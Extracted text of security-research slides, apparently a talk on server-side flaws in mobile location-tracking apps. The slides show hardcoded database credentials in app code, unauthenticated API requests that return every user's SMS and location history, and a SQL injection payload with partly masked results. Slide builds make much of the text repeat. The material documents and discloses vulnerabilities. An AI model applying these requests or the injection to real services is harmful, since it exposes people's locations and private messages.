“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection(
);
try {
…
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
password
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
password
“Authentication“
§ MySQL1Database1with following table scheme:
Field
Type
Null
Key
Default
Extra
nome
varchar(50)
NO
NULL
email
varchar(30)
NO
NULL
latitude
varchar(30)
NO
NULL
longitude
varchar(30)
NO
NULL
data
varchar(30)
NO
NULL
hora
varchar(30)
NO
NULL
codrenavam
varchar(30)
NO
NULL
placa
Varchar(30)
NO
PRI
NULL
“Authentication“
§ MySQL1Database1with following table scheme:
Field
Type
Null
Key
Default
Extra
nome
varchar(50)
NO
NULL
email
varchar(30)
NO
NULL
latitude
varchar(30)
NO
NULL
longitude
varchar(30)
NO
NULL
data
varchar(30)
NO
NULL
hora
varchar(30)
NO
NULL
codrenavam
varchar(30)
NO
NULL
placa
Varchar(30)
NO
PRI
NULL
“Authentication“
§ MySQL1Database1with following table scheme:
Field
Type
Null
Key
Default
Extra
nome
varchar(50)
NO
NULL
email
varchar(30)
NO
NULL
latitude
varchar(30)
NO
NULL
longitude
varchar(30)
NO
NULL
data
varchar(30)
NO
NULL
hora
varchar(30)
NO
NULL
codrenavam
varchar(30)
NO
NULL
placa
Varchar(30)
NO
PRI
NULL
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
password
All1in1all1we had access to over 860.000 location data of different1user,1distributed over the whole world.
Prepared Statement ? WTF !
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
96
Is that all ?
Prepared Statement ? WTF !
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "',
'" + this.atributos.getEmail() + "', 
'" + this.atributos.getLatitudeStr() + "',
'" + this.atributos.getLongitudeStr() + "',
'" + this.atributos.getDataBancoStr() + "', 
'" + this.atributos.getHoraBancoStr() + "',
'" + this.atributos.getRenavam() + "', 
'" + this.atributos.getPlaca() + "')");
prest.close();
con.close();
…
Prepared Statement ? WTF !
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "',
'" + this.atributos.getEmail() + "', 
'" + this.atributos.getLatitudeStr() + "',
'" + this.atributos.getLongitudeStr() + "',
'" + this.atributos.getDataBancoStr() + "', 
'" + this.atributos.getHoraBancoStr() + "',
'" + this.atributos.getRenavam() + "', 
'" + this.atributos.getPlaca() + "')");
prest.close();
con.close();
…
99
Stupid !
Agenda
100
§ Introduction/Motivation
§ Background Information
§ Bad Client-Side Checks with SharedPreferences
§ Client-Side and Communication Vulnerabilities
§ Server-Side Vulnerabilities
§ Responsible Disclosure Process
§ Summary
101
101
1. Authentication Request
2. Authorization Request
WTF-States of Server-Side Vulnerabilties
102
103
“ Thats a feature “
Not a Bug it‘s a Feature
§ Web1service1provides1public1access1to1user1tracks,1allowQallQby1default
Not a Bug it‘s a Feature
§ Web1service1provides1public1access1to1user1tracks,1allowQallQby1default
Not a Bug it‘s a Feature
https://www.greenalp.com/realtimetracker/index.php?viewuser=USERNAME
107
Demo Time !
108
Is that all ?
Public Webinterface
110
Authentication – What?
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0&
currentdate=07/12/2017
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0&
currentdate=07/12/2017
nothing new
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0&
currentdate=07/12/2017
your user id
nothing new
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0&
currentdate=07/12/2017
your user id
id1of1the1person1to1track
nothing new
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2********0&
currentdate=07/12/2017
your user id
id1of1the1person1to1track
requested1date
nothing new
Part1: Who Needs Authentication?
attacker
tracker backend
Response1for http://***********g.azurewebsites.net/...
07:471PM*49.8715330929084,8.639047788304
07:521PM*49.8731935027927,8.63498598738923
07:531PM*49.871533247265,8.63904788614738
…
List1of the complete track
Part1: Who Needs Authentication?
Part2: Who Needs Authentication?
§ Tracker1has1messenger1functions,1e.g.1send1messages1or1exchange1
images
§ How1do1we1get1the1messages1for1a1user1?
Part2: Who Needs Authentication?
§ Tracker1has1messenger1functions,1e.g.1send1messages1or1exchange1
images
§ How1do1we1get1the1messages1for1a1user1?
attacker
tracker backend
POST1/***************/api/get_sms HTTP/1.1
{"cnt":"100","user_id":"123456"}
result counter
Part2: Who Needs Authentication?
§ Tracker1has1messenger1functions,1e.g.1send1messages1or1exchange1
images
§ There1is1no1authentication,1all1messages11!
attacker
tracker backend
List1of sms with:
•
user_id
•
timestamp
•
content
•
phone number
Part2: Who Needs Authentication?
§ What1happens1if1user_id is1empty1?
attacker
tracker backend
POST1/***************/api/get_sms HTTP/1.1
{"cnt":"100","user_id":""}
Part2: Who Needs Authentication?
§ What happens if user_id is empty ?
attacker
tracker backend
AllQSMSQof allQusers !
123
SQL – Very Simple
Backend Attack to Track all User
http://*********/FindMyFriendB/fetch_family.php?mobile=
Backend1API extraction
Backend Attack to Track all User
[{"to_username":“*****","to_mobile":"9********9","lat":"*0.2916455","
lon":"7*.0521764","time":"12:0,27-12-2016"}]
http://*********/FindMyFriendB/fetch_family.php?mobile=
Backend1API extraction
Simple SQL Injection
http://*********/FindMyFriendB/fetch_family.php?mobile='Q or ''Q='
Backend1API extraction
Simple SQL Injection
http://*********/FindMyFriendB/fetch_family.php?mobile='Q or ''Q='
Backend1API extraction
[{"to_username":“***","to_mobile":"9********4","lat":"2*.644490000000005","lon":"*8.35368","time":"18:55,04-12-
2016"},{"to_username":“****","to_mobile":"9******9","lat":“*0.2916455","lon":“*8.0521764","time":"12:0,27-12-
2016"},{"to_username":“****","to_mobile":"9********2","lat":“*3.8710253","lon":“*5.6093338","time":"18:6,19-11-
2016"},{"to_username":“****","to_mobile":"9*******2","lat":“*6.5958902","lon":"-*7.3897167","time":"13:46,04-12-
2016"},{"to_username":“****","to_mobile":"9*******0","lat":“*2.621241065689713","lon":“*8.33497756126259","time":"9:2
5,20-11-2016"},{"to_username":“****","to_mobile":"4********1","lat":“*1.8925267","lon":"-*1.3928747","time":"3:26,12-
022017"},{"to_username":"","to_mobile":"","lat":"","lon":"","time":""},{"to_username":“***","to_mobile":"9********8",
"lat":“*5.262387837283313","lon":“*4.10851701162755","time":"23:47,20-11-
2016"},{"to_username":“****","to_mobile":"9*******6","lat":"0","lon":"0","time":"12:35"},{"to_username":“***","to_mob
ile":"8********5","lat":“*5.3401165","lon":“*5.1459643","time":"8:45,21-11-
2016"},{"to_username":“****","to_mobile":"8********8","lat":"0","lon":"0","time":"0:32"},{"to_username":“****","to_mo
bile":"9********2","lat":“*2.4393024","lon":"-*5.0414924","time":"23:0,20-11-
2016"},{"to_username":“****","to_mobile":"9********8","lat":“*2.4386613","lon":"-*5.0398665","time":"7:14,21-11-
2016"},{"to_username":“****","to_mobile":"8********6","lat":“*3.7005867","lon":“*6.9793598","time":"17:33,24-12-
2016"},{"to_username":“****","to_mobile":"8********5","lat":“*2.584631","lon":“*8.2787425","time":"20:56,22-11-
2016"},{"to_username":“*****","to_mobile":"8********1","lat":“*2.7993167","lon":“*6.2369126","time":"17:49,26-11-
2016"},{"to_username":“****","to_mobile":"9*******5","lat":“*2.5846746","lon":“*8.2787492","time":"18:28,21-11-
2016"},{"to_username":“***","to_mobile":"8*******7","lat":“*2.4069115","lon":"-*1.1435983",...
128
SQL - Simple
Accessing Images 
§ Cloud1storage for images
Accessing Images 
§ Cloud1storage for images
§ “One cloud“1for all1images
Accessing Images 
§ Cloud1storage for images
§ “One cloud“1for all1images
§ User1authentication required
§ Filter1correspondingimages by user id
Accessing Images 